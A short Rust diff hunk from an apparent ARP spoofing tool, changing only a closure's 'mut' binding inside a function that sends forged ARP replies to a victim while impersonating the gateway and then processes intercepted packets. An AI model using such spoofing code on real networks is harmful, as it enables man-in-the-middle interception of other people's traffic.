@@ -84,7 +84,7 @@ fn send_arp_spoof_packets(network_interface: &NetworkInterface, gateway_ip_addr:
     let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
     tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
-    let mut process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
+    let process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
         let ethernet_packet = rx.next().ok().and_then(|incoming_packet| {
             packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
         });
